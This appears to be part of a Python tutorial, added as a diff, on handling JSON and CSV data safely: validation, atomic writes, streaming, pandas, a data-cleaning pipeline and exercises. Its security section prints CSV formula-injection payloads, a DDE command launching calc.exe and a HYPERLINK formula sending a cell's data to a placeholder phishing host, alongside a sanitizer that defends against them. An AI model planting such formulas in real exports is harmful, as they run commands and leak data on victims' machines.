+class Order:
+    id: int
+    customer: str
+    total: Decimal
+
+# Factory validation function:
+def parse_order(d: dict) -> Order:
+    if not isinstance(d, dict):
+        raise ValueError("Order payload must be a JSON object")
+
+    # Guard required fields:
+    for field in ("id", "customer", "total"):
+        if field not in d:
+            raise ValueError(f"Missing required field: {field}")
+
+    # Subtlety: isinstance(True, int) is True in Python!
+    if type(d["id"]) is not int:
+        raise ValueError("Field 'id' must be an integer")
+    if not isinstance(d["customer"], str):
+        raise ValueError("Field 'customer' must be a string")
+
+    return Order(
+        id=d["id"],
+        customer=d["customer"].strip(),
+        total=Decimal(str(d["total"]))
+    )
+
+# Edge parsing:
+raw_json = '{"id": 101, "customer": "Alice", "total": "149.95"}'
+order = parse_order(json.loads(raw_json))
+
+# Rest of your application can now 100% trust this object:
+print(f"Verified order for {order.customer}: ${order.total}")
+```
+
+<Callout type="info" title="The isinstance(True, int) Python Quirk">
+  In Python, <code>bool</code> is a subclass of <code>int</code>! Therefore,{" "}
+  <code>isinstance(True, int)</code> evaluates to <code>True</code>. If your
+  data contract strictly demands an integer and must reject booleans, verify
+  with <code>type(val) is int</code>.
+</Callout>
+
+For large projects with dozens of complex data contracts, third-party libraries like **Pydantic** automate coercion, nested validation, and comprehensive error formatting. But the architectural principle remains identical: **validate once at the boundary, then trust internal types.**
+
+---
+
+## 14. My Script Crashed Halfway, and the File is Corrupt
+
+Recall Section 1: opening a file with `open(path, "w")` **immediately deletes the existing file's contents on disk**.
+
+If your 3:00 AM cron script crashes midway through writing 2 million orders (due to an out-of-memory error, power failure, or uncaught exception), you are left with an empty or truncated file. **Your only copy of the historical data is destroyed.**
+
+### The Solution: Crash-Proof Atomic Writes
+
+Write the entire output to a temporary file in the **same directory**, flush and sync the OS buffers, and then swap it into place using `os.replace()`. Readers will always see either the old untouched file or the new complete file—never a corrupted, half-written file.
+
+```python
+import json
+import os
+from pathlib import Path
+import tempfile
+
+def save_json_atomic(obj: object, target_path: str | Path) -> None:
+    path = Path(target_path)
+    # 1. mkstemp in the SAME directory guarantees same physical disk volume:
+    fd, tmp_file = tempfile.mkstemp(dir=path.parent, prefix=".", suffix=".tmp")
+
+    try:
+        # Wrap raw file descriptor in Python file object:
+        with os.fdopen(fd, "w", encoding="utf-8") as f:
+            json.dump(obj, f, indent=2)
+            f.flush()
+            # 2. Force operating system dirty write buffers onto physical drive:
+            os.fsync(f.fileno())
+
+        # 3. Atomic replacement:
+        os.replace(tmp_file, path)
+    except BaseException:
+        # Clean up temporary file if write fails midway:
+        if os.path.exists(tmp_file):
+            os.unlink(tmp_file)
+        raise
+
+# Safe writing in production:
+save_json_atomic({"orders_processed": 2_000_000}, "metrics.json")
+```
+
+### Why This is 100% Crash-Proof:
+
+1. `tempfile.mkstemp(dir=path.parent)`: Placing the temp file on the same filesystem ensures that replacing it is a metadata pointer swap, not a slow byte copy.
+2. `os.fsync()`: Guarantees bytes are physically written to NVMe/SSD media before replacing the target.
+3. `os.replace()`: An atomic POSIX / Windows API call. If the system crashes mid-operation, readers will see either the untouched old file or the complete new file—never a corrupted, partial file.
+
+---
+
+## 15. Two Million Rows: Working in Streams
+
+When processing 2,000,000 orders, holding the entire dataset in memory is impossible.
+
+The golden rule of high-throughput data engineering: **never hold the entire dataset in RAM; process one record, or one small batch, at a time.**
+
+### Generator Pipelines (`yield` & `yield from`)
+
+Generators let you chain transformation stages together so that only a single record lives in RAM at any given instant:
+
+```python
+import csv
+import json
+from collections.abc import Iterator
+from pathlib import Path
+
+# Stage 1: Stream rows one by one from disk
+def stream_orders(path: Path) -> Iterator[dict]:
+    with open(path, newline="", encoding="utf-8-sig") as f:
+        yield from csv.DictReader(f)
+
+# Stage 2: Filter stream lazily
+def filter_paid_orders(rows: Iterator[dict]) -> Iterator[dict]:
+    for row in rows:
+        if row.get("status") == "paid":
+            yield row
+
+# Stage 3: Write out to JSON Lines
+def write_jsonl_stream(records: Iterator[dict], destination: Path) -> int:
+    count = 0
+    with open(destination, "w", encoding="utf-8") as f:
+        for record in records:
+            f.write(json.dumps(record) + "\n")
+            count += 1
+    return count
+
+# Execute full pipeline: Memory consumption is ~1 row!
+input_file = Path("historical_orders.csv")
+output_file = Path("paid_orders.jsonl")
+
+# total = write_jsonl_stream(filter_paid_orders(stream_orders(input_file)), output_file)
+```
+
+### Batching for Network & Database Operations
+
+When each record triggers an expensive database write or network API request, processing one-at-a-time is slow. Group records into batches (e.g. 1,000 at a time) using `itertools.islice`:
+
+```python
+from itertools import islice
+from collections.abc import Iterable, Iterator
+
+def batch_stream(iterable: Iterable, batch_size: int = 1000) -> Iterator[list]:
+    it = iter(iterable)
+    while batch := list(islice(it, batch_size)):
+        yield batch
+
+# Usage:
+# for order_batch in batch_stream(stream_orders(input_file), batch_size=500):
+#     database.bulk_insert(order_batch)
+```
+
+---
+
+## 16. pandas: When Data is Analysis, Not Plumbing
+
+**pandas** is a high-performance third-party data analysis library (`pip install pandas`).
+
+<Callout type="info" title="Architectural Choice: Standard Library vs. pandas">
+  - **Use standard library (`csv` & `json`):** When you are building{" "}
+  <em>data plumbing</em>—streaming records between APIs, validating records, or
+  routing messages. It has zero external dependencies, minimal startup overhead,
+  and predictable memory use. - **Use pandas:** When you need to perform{" "}
+  <em>vectorized data analysis</em>—grouping, aggregations, rolling averages,
+  matrix math, or complex joins.
+</Callout>
+
+```python
+import pandas as pd
+
+# Analyze 2 million orders in pandas:
+df = pd.read_csv("orders.csv", dtype={"zip": str}, parse_dates=["placed_at"])
+revenue_by_customer = df.groupby("customer")["total"].sum()
+```
+
+### Three Habits to Prevent Disasters in pandas:
+
+1. **Pin Identifier Types:** Always specify `dtype={"zip": str, "account_id": str}`. Otherwise, pandas interprets `02134` as the integer `2134`, destroying leading zeroes forever!
+2. **Chunk Large Files:** Use `pd.read_csv("big.csv", chunksize=100_000)` to iterate through manageable chunks without exhausting server RAM.
+3. **Flatten Nested JSON:** Use `pd.json_normalize(data)` to automatically unpack nested dictionaries like `{"location": {"city": "Berlin"}}` into a tabular DataFrame column named `location.city`.
+
+---
+
+## 17. A Partner's CSV is Genuinely Nasty
+
+Real-world third-party data frequently breaks basic CSV assumptions. The `csv` module provides tools to handle the nastiest edge cases:
+
+### 1. Reusable Dialects
+
+If you regularly ingest an unusual format from a partner, name and register it once:
+
+```python
+import csv
+
+csv.register_dialect(
+    "partner_de",
+    delimiter=";",
+    quotechar='"',
+    skipinitialspace=True,
+    doublequote=True
+)
+
+with open("partner_de.csv", newline="", encoding="utf-8-sig") as f:
+    reader = csv.reader(f, dialect="partner_de")
+```
+
+### 2. Enforcing Strict Syntax
+
+By default, the `csv` parser forgives malformed quotes and attempts to recover. In high-security financial pipelines where silent corruption is unacceptable, pass `strict=True`:
+
+```python
+# Raises csv.Error immediately on malformed quoting:
+reader = csv.reader(f, strict=True)
+```
+
+### 3. Handling Giant Fields (`field_size_limit`)
+
+If a partner stores raw HTML, base64 strings, or massive error stack traces inside a single CSV cell exceeding 131,072 characters, Python crashes with `_csv.Error: field larger than field limit`.
+
+Raise the buffer threshold intentionally:
+
+```python
+import csv
+import sys
+
+# Raise limit to 10 Megabytes:
+csv.field_size_limit(10_000_000)
+```
+
+### 4. Handling Ragged (Malformed) Rows in `DictReader`
+
+- **Short rows (missing columns):** DictReader sets missing keys to `None` (or the value of `restval`).
+- **Long rows (extra columns):** DictReader collects extra values into a list under the dictionary key `None` (or the value of `restkey`).
+
+```python
+with open("ragged.csv", newline="", encoding="utf-8") as f:
+    reader = csv.DictReader(f, restkey="__extra__", restval="__missing__")
+    for row in reader:
+        if "__extra__" in row or "__missing__" in row.values():
+            print(f"Malformed row detected at line {reader.line_num}: {row}")
+```
+
+---
+
+## 18. Security: Files are an Attack Surface
+
+When your shop accepts files uploaded by customers or third parties, treat every file as a vector for remote code execution or data theft.
+
+### 1. Use `json`, Never `pickle`, for External Data
+
+Python's built-in `pickle` module can serialize arbitrary Python objects. When `pickle.load()` runs, it can execute arbitrary shell commands embedded inside the payload.
+
+**`json.loads()` is mathematically incapable of executing code.** It only builds basic primitives (strings, numbers, dicts, lists, booleans, null).
+
+### 2. Guard Against Recursion and Memory Bombs
+
+A malicious client can send a small 50KB payload consisting of nested brackets: `[[[[...]]]]` repeated 5,000 times. Parsing this will crash your Python process with a `RecursionError` or stack overflow.
+
+```python
+import json
+
+def safe_json_loads(raw_text: str, max_bytes: int = 1_000_000):
+    if len(raw_text.encode("utf-8")) > max_bytes:
+        raise ValueError("Payload size exceeds security limit")
+    try:
+        return json.loads(raw_text)
+    except (json.JSONDecodeError, RecursionError) as exc:
+        raise ValueError(f"Malformed or hostile JSON payload: {exc}")
+```
+
+### 3. CSV Formula Injection (DDE Attack)
+
+If you allow users to input text (like their customer name) and then export those orders to a CSV that an accountant opens in Microsoft Excel or Google Sheets:
+
+An attacker sets their customer name to:
+
+```text
+=CMD|' /C calc.exe'!A0
+```
+
+or:
+
+```text
+=HYPERLINK("http://malicious-phishing.com/leak?d=" & A2, "Click for Refund")
+```
+
+When opened in Excel, the spreadsheet program treats any cell starting with `=`, `+`, `-`, or `@` as an executable formula!
+
+<Callout type="error" title="Neutralizing Formula Injection">
+  Always prefix untrusted text fields that begin with formula operators with a
+  single quote (<code>'</code>):
+</Callout>
+
+```python
+def sanitize_csv_cell(value: object) -> object:
+    if isinstance(value, str):
+        # Prefix single quote to force spreadsheet programs to treat as literal text:
+        if value.startswith(("=", "+", "-", "@")):
+            return "'" + value
+    return value
+```
+
+---
+
+## 19. Speed & Performance
+
+Before swapping libraries, understand where the bottlenecks live:
+
+1. **Python's standard `json` module is written in compiled C.** For 95% of applications, it is fast enough.
+2. **Third-Party Alternative (`orjson`):** If profiling proves JSON serialization is your application's primary CPU bottleneck, `orjson` is significantly faster:
+   - Returns `bytes` instead of `str`.
+   - Natively serializes `dataclass`, `datetime`, and `UUID` without custom functions.
+3. **The Big Win is Architectural:** Switching from whole-file loading (`json.load`) to line-by-line streaming (`jsonl`), and only parsing the columns you need, yields $10\times$ larger speedups than switching JSON libraries.
+
+---
+
+## 20. Capstone: The Production Data Cleaning Pipeline
+
+Let's combine every pattern from this lesson into a complete, hardened production pipeline.
+
+**The Task:**
+Your script must ingest a messy `orders_raw.csv`, stream valid orders to `orders_clean.jsonl`, and isolate every invalid, malformed, or fraudulent row into `rejects.csv` alongside the exact line number and reason. **No data is ever silently dropped.**
+
+```python
+import csv
+from decimal import Decimal, InvalidOperation
+import json
+import os
+from pathlib import Path
+import tempfile
+
+def clean_orders_pipeline(
+    src_csv: str | Path,
+    clean_jsonl: str | Path,
+    rejects_csv: str | Path
+) -> tuple[int, int]:
+    valid_count = 0
+    rejected_count = 0
+
+    src = Path(src_csv)
+    clean_dst = Path(clean_jsonl)
+    rejects_dst = Path(rejects_csv)
+
+    # Use atomic write pattern for clean output:
+    tmp_fd, tmp_clean_path = tempfile.mkstemp(dir=clean_dst.parent, suffix=".tmp")
+
+    with open(src, "r", newline="", encoding="utf-8-sig") as fin, \
+         os.fdopen(tmp_fd, "w", encoding="utf-8") as fclean, \
+         open(rejects_dst, "w", newline="", encoding="utf-8") as freject:
+
+        reader = csv.DictReader(fin)
+        fieldnames = reader.fieldnames or []
+
+        # Output writer for rejected records:
+        reject_writer = csv.DictWriter(
+            freject,
+            fieldnames=[*fieldnames, "rejection_reason"],
+            extrasaction="ignore"
+        )
+        reject_writer.writeheader()
+
+        for row in reader:
+            line_no = reader.line_num
+            try:
+                # 1. Structural check
+                if None in row or any(v is None for v in row.values()):
+                    raise ValueError("Ragged row: missing or extra column values")
+
+                # 2. Field conversions and business logic validation
+                order_id = int(row["id"])
+                product = row["product"].strip()
+                if not product:
+                    raise ValueError("Product description cannot be empty")
+
+                price = Decimal(row["price"])
+                if price <= 0:
+                    raise ValueError(f"Invalid non-positive price: {price}")
+
+                # 3. Clean record construction
+                clean_record = {
+                    "id": order_id,
+                    "product": product,
+                    "price": str(price),  # Exact Decimal preserved as string!
+                    "status": row.get("status", "pending").strip().lower()
+                }
+
+                # 4. Stream to JSON Lines:
+                fclean.write(json.dumps(clean_record) + "\n")
+                valid_count += 1
+
+            except (KeyError, TypeError, AttributeError, ValueError, InvalidOperation) as exc:
+                # Keep original row and append exact error reason:
+                reject_writer.writerow({
+                    **row,
+                    "rejection_reason": f"Line {line_no}: {type(exc).__name__} - {exc}"
+                })
+                rejected_count += 1
+
+        fclean.flush()
+        os.fsync(fclean.fileno())
+
+    # Atomically swap clean file into place:
+    os.replace(tmp_clean_path, clean_dst)
+
+    return valid_count, rejected_count
+
+# Verification test run:
+if __name__ == "__main__":
+    # Create sample messy input CSV:
+    raw_data = (
+        "id,product,price,status\n"
+        "101,Mechanical Keyboard,129.99,paid\n"
+        "102,,45.00,paid\n"                      # Missing product
+        "103,USB-C Cable,-5.00,paid\n"            # Negative price
+        "104,Gaming Mouse,invalid_price,paid\n"   # Unparseable price
+        "105,4K Monitor,399.50,paid\n"
+    )
+    Path("orders_raw.csv").write_text(raw_data, encoding="utf-8")
+
+    good, bad = clean_orders_pipeline("orders_raw.csv", "orders_clean.jsonl", "rejects.csv")
+    print(f"Pipeline complete: {good} valid records, {bad} rejected records.")
+
+    print("\n--- Valid Clean Records (JSONL) ---")
+    print(Path("orders_clean.jsonl").read_text(encoding="utf-8"))
+
+    print("--- Rejections (CSV) ---")
+    print(Path("rejects.csv").read_text(encoding="utf-8"))
+
+    # Cleanup demo files
+    for p in ("orders_raw.csv", "orders_clean.jsonl", "rejects.csv"):
+        Path(p).unlink(missing_ok=True)
+```
+
+### Reviewing the Architecture:
+
+- **Constant Memory $O(1)$:** Can process 2,000,000 rows without memory usage ever growing beyond a single line.
+- **`utf-8-sig`:** Absorbs Excel BOM characters automatically.
+- **`newline=""`:** Prevents Windows blank-line corruption.
+- **Atomic Swap:** Readers never observe a partial or corrupted `orders_clean.jsonl`.
+- **Exact Money:** Uses `Decimal` validation and string serialization.
+- **Explicit Exceptions:** Catches `TypeError` and `AttributeError` (which occur when calling `.strip()` on `None` from ragged rows) alongside `ValueError`.
+
+---
+
+## 21. Summary Reference & Advanced Practice
+
+### The Level Progression Matrix
+
+| Level            | What You Can Confidently Do                                                                                                                                                                              |
+| :--------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Beginner**     | Save/load JSON with `dump`/`load`; read/write CSV with `csv.reader`/`writer`; explain why `split(",")` is an anti-pattern.                                                                               |
+| **Intermediate** | Serialize `datetime` and `Decimal` safely; use `DictReader`/`DictWriter`; handle delimiters, quoting, BOMs, and encodings; stream JSON Lines; flatten nested hierarchies.                                |
+| **Advanced**     | Enforce contracts at untrusted boundaries; prevent corruption with atomic writes; stream generator pipelines with $O(1)$ memory; protect against CSV injection; build zero-data-loss cleaning pipelines. |
+
+> **The Guiding Principle:** Every data format is a **contract** between a sender and a receiver. Beginners learn the syntax of the contract. Intermediates learn where Python types disagree with the format. Advanced engineers assume the other party will break the contract, and architect systems so that breakage is safely detected, isolated, and audited.
+
+---
+
+### Advanced Practice Exercises
+
+<Accordions>
+<Accordion title="Exercise 4: The Strict JSON Loader">
+
+**Problem:**
+Write `load_strict(path)` that loads a JSON file, but raises an exception if the file contains duplicate keys, contains `NaN`/`Infinity`, or converts numbers to inexact floats (all floats must become `Decimal`).
+
+```python
+from decimal import Decimal
+import json
+from pathlib import Path
+
+def load_strict(path: str | Path) -> object:
+    def reject_duplicates(pairs: list[tuple]) -> dict:
+        keys = [k for k, _ in pairs]
+        if len(keys) != len(set(keys)):
+            raise ValueError(f"Duplicate keys in JSON object: {keys}")
+        return dict(pairs)
+
+    def reject_constants(constant_name: str):
+        # Called for 'NaN', 'Infinity', '-Infinity'
+        raise ValueError(f"Illegal RFC 8259 constant detected: {constant_name}")
+
+    with open(path, "r", encoding="utf-8") as f:
+        return json.load(
+            f,
+            object_pairs_hook=reject_duplicates,
+            parse_constant=reject_constants,
+            parse_float=Decimal
+        )
+
+# Test 1: Decimal precision
+Path("test_strict.json").write_text('{"price": 149.95}', encoding="utf-8")
+data = load_strict("test_strict.json")
+assert isinstance(data["price"], Decimal)
+
+# Test 2: Reject NaN
+Path("test_strict.json").write_text('{"val": NaN}', encoding="utf-8")
+try:
+    load_strict("test_strict.json")
+    assert False, "Should have raised ValueError"
+except ValueError as e:
+    print("Caught illegal constant:", e)
+
+Path("test_strict.json").unlink()
+print("Exercise 4 passed!")
+```
+
+</Accordion>
+
+<Accordion title="Exercise 5: Memory-Bounded Deduplication Generator">
+
+**Problem:**
+Write a generator `dedupe_stream(rows, key)` that takes an iterable of dictionaries and yields only the first row for each distinct value of `key`. The memory footprint must grow only with the count of distinct keys, not the size of the rows.
+
+```python
+from collections.abc import Iterable, Iterator
+
+def dedupe_stream(rows: Iterable[dict], key: str) -> Iterator[dict]:
+    seen_keys = set()
+    for row in rows:
+        val = row.get(key)
+        if val not in seen_keys:
+            seen_keys.add(val)
+            yield row
+
+# Verification:
+orders = [
+    {"order_id": 101, "customer": "Alice", "data": "large payload..."},
+    {"order_id": 102, "customer": "Bob", "data": "large payload..."},
+    {"order_id": 103, "customer": "Alice", "data": "large payload..."},  # Duplicate Alice
+]
+
+deduped = list(dedupe_stream(orders, key="customer"))
+assert len(deduped) == 2
+assert [d["customer"] for d in deduped] == ["Alice", "Bob"]
+print("Exercise 5 passed!")
+```
+
+</Accordion>
+
+<Accordion title="Exercise 6: Repair vs. Reject Strategy">
+
+**Problem:**
+Extend `clean_orders_pipeline` from Section 20 with a conscious repair strategy:
+
+- If a row has a missing `product`, repair it to `"UNKNOWN"` instead of rejecting it.
+- If a row has a negative or missing `price`, reject it.
+
+**Architectural Justification:**
+A missing product label is cosmetic and recoverable (an admin can correlate the SKU or order ID later). In contrast, a corrupted price alters financial ledgers, taxes, and customer bank charges—guessing a number is dangerous. **Rule: only repair what you can repair without inventing financial or contractual facts.**
+
+```python
+# In Section 20 pipeline loop:
+product = (row.get("product") or "").strip()
+if not product:
+    product = "UNKNOWN"  # Safe repair: non-financial fallback
+
+price_val = row.get("price")
+if not price_val:
+    raise ValueError("Missing price")  # Safe reject: never guess money!
+
+price = Decimal(price_val)
+if price <= 0:
+    raise ValueError(f"Non-positive price: {price}")
+```
+
+</Accordion>
+</Accordions>
+
+---
+
+## Next Steps
+
+Congratulations on completing all core mechanics, error handling, filesystem architecture, and data parsing lessons in Stage 1!
+
+Review everything you've learned in the **[Quick Reference Cheat Sheet](/docs/learn-python/01-fundamentals/quick-reference)**, or build your streaming log analyzer CLI tool in the **[Capstone: logpeek CLI Log Analyzer](/docs/learn-python/01-fundamentals/capstone-log-analyzer)**!
